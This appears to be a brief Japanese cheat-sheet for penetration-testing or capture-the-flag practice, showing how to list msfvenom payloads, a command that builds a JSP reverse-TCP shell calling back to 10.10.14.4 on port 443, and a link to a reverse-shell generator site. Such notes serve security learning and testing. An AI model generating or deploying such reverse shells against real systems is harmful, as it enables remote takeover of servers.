# # MFSVENOM
## ## Payloadを探す
```zsh
msfvenom --list payload # いろいろなペイロードが表示される。
msfvenom --list payload # こんな感じで使用できる。
```

## ## 作成する
```zsh
msfvenom --payload java/jsp_shell_reverse_tcp --format raw --out shell.jsp LHOST=10.10.14.4 LPORT=443
```

# # Web Tool
- https://www.revshells.com/